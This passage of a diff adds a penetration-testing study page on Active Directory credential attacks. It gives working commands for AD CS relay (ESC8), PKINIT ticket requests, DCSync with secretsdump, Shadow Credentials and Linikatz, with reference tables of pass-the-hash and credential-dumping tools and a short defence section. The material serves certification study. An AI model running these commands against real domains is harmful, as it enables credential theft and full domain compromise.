+                    <div class="pc-node-body"><p>impacket-ticketConverter swaps a Linux ccache for a Windows .kirbi and back, so a ticket harvested on one platform works on the other. Linikatz is Mimikatz for UNIX: run as root, it extracts credentials and tickets from FreeIPA, SSSD, Samba and more into ccache/keytab files for reuse.</p><pre class="pc-cmd"><code>impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+./linikatz.sh</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-ptc" data-to="ptc"><span aria-hidden="true">&#8595;</span> Proceed to Pass the Certificate</a>
+          </li>
+          <li class="pc-phase" id="pcphase-ptc">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">06</span>
+              <h2 class="pc-phase-title" id="pcphase-ptc-title">Pass the Certificate</h2>
+              <p class="pc-phase-blurb">Use an X.509 certificate to obtain a TGT via PKINIT. The route into credential-less territory when you can get a certificate for a target, often through AD CS abuse or Shadow Credentials.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node" id="pcnode-ptc-concept">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">PKINIT &amp; the idea</span></summary>
+                  <div class="pc-node-body"><p>PKINIT (Public Key Cryptography for Initial Authentication) extends Kerberos to use public-key cryptography in the initial exchange, normally for smart-card logon. Pass-the-Certificate uses an X.509 certificate and its private key to obtain a TGT for the certificate&#39;s subject, then it is ordinary Pass-the-Ticket. It pairs with AD CS attacks and Shadow Credentials. Full AD CS coverage is a module of its own; this is the lateral-movement slice.</p></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ptc-esc8">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">AD CS NTLM relay (ESC8)</span></summary>
+                  <div class="pc-node-body"><p>ESC8 relays NTLM authentication to an AD CS web-enrolment endpoint (HTTP /certsrv by default) to mint a certificate for the victim. Run ntlmrelayx with --adcs and a --template (KerberosAuthentication is the DC auth template; enumerate with Certipy), then coerce a machine to authenticate, e.g. the printer bug (printerbug.py) forces a DC to connect back. The relay issues a PKCS#12 certificate for the machine account.</p><pre class="pc-cmd"><code>impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:&#39;pass&#39;@10.129.234.109 10.10.16.12</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ptc-tgt">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Certificate to TGT to DCSync</span></summary>
+                  <div class="pc-node-body"><p>With the .pfx, gettgtpkinit.py (PKINITtools) requests a TGT via PKINIT and saves a ccache. Export KRB5CCNAME and you are back in Pass-the-Ticket territory: as a DC machine account, run secretsdump -k -no-pass for a DCSync to pull any account&#39;s NT hash (e.g. the domain Administrator). If PKINIT is unsupported for the target, PassTheCert authenticates to LDAPS with the certificate instead.</p><pre class="pc-cmd"><code>python3 gettgtpkinit.py -cert-pfx DC01.pfx -dc-ip 10.129.234.109 &#39;inlanefreight.local/dc01$&#39; /tmp/dc.ccache
+export KRB5CCNAME=/tmp/dc.ccache
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator &#39;INLANEFREIGHT.LOCAL/DC01$&#39;@DC01.INLANEFREIGHT.LOCAL</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ptc-shadow">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Shadow Credentials (pywhisker)</span></summary>
+                  <div class="pc-node-body"><p>If you can write a victim&#39;s msDS-KeyCredentialLink attribute (the AddKeyCredentialLink edge in BloodHound), you can add your own key-credential and authenticate as them via PKINIT. pywhisker generates an X.509 certificate and writes the public key to the attribute, returning a .pfx and its password; feed that to gettgtpkinit.py for a TGT, then pass the ticket (e.g. Evil-WinRM with Kerberos if the victim is in Remote Management Users).</p><pre class="pc-cmd"><code>pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p &#39;pass&#39; --target jpinkman --action add
+python3 gettgtpkinit.py -cert-pfx target.pfx -pfx-pass &#39;&lt;pfx-pass&gt;&#39; -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local</code></pre></div>
+                </details>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-defence" data-to="defence"><span aria-hidden="true">&#8595;</span> Proceed to Defence</a>
+          </li>
+          <li class="pc-phase" id="pcphase-defence">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">07</span>
+              <h2 class="pc-phase-title" id="pcphase-defence-title">Defence (reference)</h2>
+              <p class="pc-phase-blurb">The other side of the coin: how organisations should set password policy and protect credentials. Reference-only, to inform remediation advice in the report.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node" id="pcnode-def-policy">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Password policy</span></summary>
+                  <div class="pc-node-body"><p>A password policy sets rules across the whole credential lifecycle, not just minimum length. Standards to cite: NIST SP 800-63B, the CIS Password Policy Guide and PCI DSS. A typical baseline wants 8+ characters with mixed case, a digit and a symbol, not the username. Two caveats worth raising: enforced expiry (the old 90-day rule) tends to produce predictable increments (Inlanefreight01! becomes Inlanefreight02!), so NIST now advises against routine expiry; and a policy should blacklist the company name, common words, months, seasons and variants of password and welcome. Enforce it technically (an AD password-policy GPO) and communicate it.</p></div>
+                </details>
+              </li>
+              <li class="pc-node" id="pcnode-def-managers">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Password managers</span></summary>
+                  <div class="pc-node-body"><p>People hold roughly a hundred passwords, which drives reuse and weak choices; a password manager stores strong, unique credentials in an encrypted database behind one master password. Cloud managers (1Password, Bitwarden, Dashlane, Keeper, LastPass, NordPass) sync across devices and typically use zero-knowledge encryption: keys are derived from the master password so the provider cannot read the vault. Local managers (KeePass, KWallet, Password Safe) keep the database on the host, trading sync for the user owning its storage. Both use key-derivation functions with random salt against precomputation.</p></div>
+                </details>
+              </li>
+              <li class="pc-node" id="pcnode-def-passwordless">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Going passwordless</span></summary>
+                  <div class="pc-node-body"><p>A password is a knowledge factor, exposed to theft, reuse and sharing. Stronger assurance comes from a possession or inherent factor: MFA, one-time and time-based codes (OTP/TOTP), and FIDO2 passwordless logins with a hardware key such as a YubiKey. Vendors (Microsoft, Okta, Auth0, Ping) push passwordless to remove the knowledge factor entirely; device-compliance and IP restrictions add further gates. Evaluate the implementation before trusting any alternative.</p></div>
+                </details>
+              </li>
+            </ul>
+          </li>
+          </ol>
+        </section>
+        <section class="pc-ref" id="pcref-lazagne-modules" aria-labelledby="pcref-lazagne-modules-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-lazagne-modules-title">LaZagne modules</h2>
+            <p class="pc-ref-intro">The module groups LaZagne runs against stored credentials; run all for everything, or name one. Filter by module.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-lazagne-modules-q">Filter lazagne modules</label>
+            <input class="tool-input pc-ref-input" id="pcref-lazagne-modules-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="lazagne-modules" />
+            <span class="pc-ref-count" data-ref-count="lazagne-modules" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="lazagne-modules">
+              <thead><tr><th scope="col">Module</th><th scope="col">What it extracts</th></tr></thead>
+              <tbody>
+                <tr data-search="browsers saved passwords from chromium, firefox, edge, opera and ~35 browsers"><td>browsers</td><td>Saved passwords from Chromium, Firefox, Edge, Opera and ~35 browsers</td></tr>
+                <tr data-search="chats credentials from chat apps including skype"><td>chats</td><td>Credentials from chat apps including Skype</td></tr>
+                <tr data-search="mails mailbox passwords including outlook and thunderbird"><td>mails</td><td>Mailbox passwords including Outlook and Thunderbird</td></tr>
+                <tr data-search="memory passwords from memory, targeting keepass and lsass"><td>memory</td><td>Passwords from memory, targeting KeePass and LSASS</td></tr>
+                <tr data-search="sysadmin config-file credentials from tools like openvpn and winscp"><td>sysadmin</td><td>Config-file credentials from tools like OpenVPN and WinSCP</td></tr>
+                <tr data-search="windows windows credentials: lsa secrets, credential manager and more"><td>windows</td><td>Windows credentials: LSA secrets, Credential Manager and more</td></tr>
+                <tr data-search="wifi saved wifi credentials"><td>wifi</td><td>Saved WiFi credentials</td></tr>
+                <tr data-search="ssh / git / aws keys and tokens from ssh, git and aws config (linux)"><td>ssh / git / aws</td><td>Keys and tokens from SSH, Git and AWS config (Linux)</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="lazagne-modules" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-linux-logs" aria-labelledby="pcref-linux-logs-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-linux-logs-title">Linux log files</h2>
+            <p class="pc-ref-intro">Where authentication and activity are recorded; grep these for accepted, session, failed and sudo lines. Filter by file.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-linux-logs-q">Filter linux log files</label>
+            <input class="tool-input pc-ref-input" id="pcref-linux-logs-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="linux-logs" />
+            <span class="pc-ref-count" data-ref-count="linux-logs" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="linux-logs">
+              <thead><tr><th scope="col">File</th><th scope="col">What it holds</th></tr></thead>
+              <tbody>
+                <tr data-search="/var/log/auth.log authentication logs (debian/ubuntu)"><td><code>/var/log/auth.log</code></td><td>Authentication logs (Debian/Ubuntu)</td></tr>
+                <tr data-search="/var/log/secure authentication logs (redhat/centos)"><td><code>/var/log/secure</code></td><td>Authentication logs (RedHat/CentOS)</td></tr>
+                <tr data-search="/var/log/syslog generic system activity"><td><code>/var/log/syslog</code></td><td>Generic system activity</td></tr>
+                <tr data-search="/var/log/messages generic system activity"><td><code>/var/log/messages</code></td><td>Generic system activity</td></tr>
+                <tr data-search="/var/log/cron cron job activity"><td><code>/var/log/cron</code></td><td>Cron job activity</td></tr>
+                <tr data-search="/var/log/faillog failed login attempts"><td><code>/var/log/faillog</code></td><td>Failed login attempts</td></tr>
+                <tr data-search="/var/log/httpd apache logs (access/error)"><td><code>/var/log/httpd</code></td><td>Apache logs (access/error)</td></tr>
+                <tr data-search="/var/log/mysqld.log mysql server logs"><td><code>/var/log/mysqld.log</code></td><td>MySQL server logs</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="linux-logs" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-wireshark-filters" aria-labelledby="pcref-wireshark-filters-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-wireshark-filters-title">Wireshark filters</h2>
+            <p class="pc-ref-intro">Display filters for narrowing live or captured traffic to credential-bearing packets. Filter by expression.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-wireshark-filters-q">Filter wireshark filters</label>
+            <input class="tool-input pc-ref-input" id="pcref-wireshark-filters-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="wireshark-filters" />
+            <span class="pc-ref-count" data-ref-count="wireshark-filters" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="wireshark-filters">
+              <thead><tr><th scope="col">Filter</th><th scope="col">What it matches</th></tr></thead>
+              <tbody>
+                <tr data-search="http all http traffic (cleartext web)"><td><code>http</code></td><td>All HTTP traffic (cleartext web)</td></tr>
+                <tr data-search="http.request.method == &quot;post&quot; post requests; form logins over cleartext http"><td><code>http.request.method == &quot;POST&quot;</code></td><td>POST requests; form logins over cleartext HTTP</td></tr>
+                <tr data-search="http contains &quot;passw&quot; packets whose bytes contain the string passw"><td><code>http contains &quot;passw&quot;</code></td><td>Packets whose bytes contain the string passw</td></tr>
+                <tr data-search="tcp.port == 80 traffic on a port (http here)"><td><code>tcp.port == 80</code></td><td>Traffic on a port (HTTP here)</td></tr>
+                <tr data-search="tcp.stream eq 53 one tcp conversation, end to end"><td><code>tcp.stream eq 53</code></td><td>One TCP conversation, end to end</td></tr>
+                <tr data-search="ip.addr == 10.0.0.5 packets to or from an address"><td><code>ip.addr == 10.0.0.5</code></td><td>Packets to or from an address</td></tr>
+                <tr data-search="ftp ftp control channel (cleartext user/pass)"><td><code>ftp</code></td><td>FTP control channel (cleartext USER/PASS)</td></tr>
+                <tr data-search="dns dns queries and responses"><td><code>dns</code></td><td>DNS queries and responses</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="wireshark-filters" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-cleartext-protocols" aria-labelledby="pcref-cleartext-protocols-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-cleartext-protocols-title">Cleartext vs encrypted protocols</h2>
+            <p class="pc-ref-intro">Plaintext protocols and their secure counterparts; the plaintext ones leak credentials to a sniffer. Filter by protocol.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-cleartext-protocols-q">Filter cleartext vs encrypted protocols</label>
+            <input class="tool-input pc-ref-input" id="pcref-cleartext-protocols-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="cleartext-protocols" />
+            <span class="pc-ref-count" data-ref-count="cleartext-protocols" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="cleartext-protocols">
+              <thead><tr><th scope="col">Plaintext</th><th scope="col">Encrypted</th><th scope="col">Use</th></tr></thead>
+              <tbody>
+                <tr data-search="http https web pages and resources"><td>HTTP</td><td>HTTPS</td><td>Web pages and resources</td></tr>
+                <tr data-search="ftp ftps / sftp file transfer"><td>FTP</td><td>FTPS / SFTP</td><td>File transfer</td></tr>
+                <tr data-search="snmp snmpv3 network device management"><td>SNMP</td><td>SNMPv3</td><td>Network device management</td></tr>
+                <tr data-search="pop3 pop3s retrieving email"><td>POP3</td><td>POP3S</td><td>Retrieving email</td></tr>
+                <tr data-search="imap imaps managing email on the server"><td>IMAP</td><td>IMAPS</td><td>Managing email on the server</td></tr>
+                <tr data-search="smtp smtps sending email"><td>SMTP</td><td>SMTPS</td><td>Sending email</td></tr>
+                <tr data-search="ldap ldaps directory queries (credentials, roles)"><td>LDAP</td><td>LDAPS</td><td>Directory queries (credentials, roles)</td></tr>
+                <tr data-search="telnet ssh remote shell"><td>Telnet</td><td>SSH</td><td>Remote shell</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="cleartext-protocols" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-pth-tools" aria-labelledby="pcref-pth-tools-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-pth-tools-title">Pass-the-Hash tools</h2>
+            <p class="pc-ref-intro">What to reach for by platform and protocol when passing an NTLM hash. Filter by tool or platform.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-pth-tools-q">Filter pass-the-hash tools</label>
+            <input class="tool-input pc-ref-input" id="pcref-pth-tools-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="pth-tools" />
+            <span class="pc-ref-count" data-ref-count="pth-tools" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="pth-tools">
+              <thead><tr><th scope="col">Tool</th><th scope="col">Platform</th><th scope="col">How it passes the hash</th></tr></thead>
+              <tbody>
+                <tr data-search="sekurlsa::pth (mimikatz) windows starts a process under the user&#39;s context with /rc4 or /ntlm"><td><code>sekurlsa::pth (Mimikatz)</code></td><td>Windows</td><td>Starts a process under the user&#39;s context with /rc4 or /NTLM</td></tr>
+                <tr data-search="invoke-thehash windows powershell smb/wmi exec with -hash"><td><code>Invoke-TheHash</code></td><td>Windows</td><td>PowerShell SMB/WMI exec with -Hash</td></tr>
+                <tr data-search="impacket-psexec linux system shell via a dropped service, -hashes :nt"><td><code>impacket-psexec</code></td><td>Linux</td><td>SYSTEM shell via a dropped service, -hashes :NT</td></tr>
+                <tr data-search="impacket-wmiexec linux quieter semi-interactive exec over wmi, -hashes :nt"><td><code>impacket-wmiexec</code></td><td>Linux</td><td>Quieter semi-interactive exec over WMI, -hashes :NT</td></tr>
+                <tr data-search="netexec smb -h linux auth/spray a hash across hosts; -x to run a command"><td><code>netexec smb -H</code></td><td>Linux</td><td>Auth/spray a hash across hosts; -x to run a command</td></tr>
+                <tr data-search="evil-winrm -h linux interactive shell over winrm with the hash"><td><code>evil-winrm -H</code></td><td>Linux</td><td>Interactive shell over WinRM with the hash</td></tr>
+                <tr data-search="xfreerdp /pth linux rdp gui; needs restricted admin mode on the target"><td><code>xfreerdp /pth</code></td><td>Linux</td><td>RDP GUI; needs Restricted Admin Mode on the target</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="pth-tools" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-kerberos-storage" aria-labelledby="pcref-kerberos-storage-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-kerberos-storage-title">Kerberos ticket storage</h2>
+            <p class="pc-ref-intro">Where Kerberos credentials live on each platform and what you need to use them. Filter by artefact.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-kerberos-storage-q">Filter kerberos ticket storage</label>
+            <input class="tool-input pc-ref-input" id="pcref-kerberos-storage-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="kerberos-storage" />
+            <span class="pc-ref-count" data-ref-count="kerberos-storage" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="kerberos-storage">
+              <thead><tr><th scope="col">Artefact</th><th scope="col">Location</th><th scope="col">Notes</th></tr></thead>
+              <tbody>
+                <tr data-search="windows ticket (lsass) in lsass memory; export to .kirbi admin for all sessions; mimikatz / rubeus"><td>Windows ticket (LSASS)</td><td>In LSASS memory; export to .kirbi</td><td>Admin for all sessions; mimikatz / Rubeus</td></tr>
+                <tr data-search="ccache file (linux) /tmp/krb5cc_* (path in krb5ccname) read access is enough; set krb5ccname to use"><td>ccache file (Linux)</td><td>/tmp/krb5cc_* (path in KRB5CCNAME)</td><td>Read access is enough; set KRB5CCNAME to use</td></tr>
+                <tr data-search="keytab file (linux) e.g. /etc/krb5.keytab, *.keytab needs read+write; kinit -k -t to import"><td>keytab file (Linux)</td><td>e.g. /etc/krb5.keytab, *.keytab</td><td>Needs read+write; kinit -k -t to import</td></tr>
+                <tr data-search="machine account ticket /etc/krb5.keytab root-only; impersonates the computer account"><td>Machine account ticket</td><td>/etc/krb5.keytab</td><td>Root-only; impersonates the computer account</td></tr>
+                <tr data-search="kirbi file on disk (converted from ccache) impacket-ticketconverter swaps ccache and kirbi"><td>kirbi file</td><td>On disk (converted from ccache)</td><td>impacket-ticketConverter swaps ccache and kirbi</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="kerberos-storage" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+      </main>
+      <footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/talks/">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer>
+    </div>
+    <script type="module" src="/cpts/password-cracking/pc-map.js?v=pc1"></script>
+  </body>
+</html>
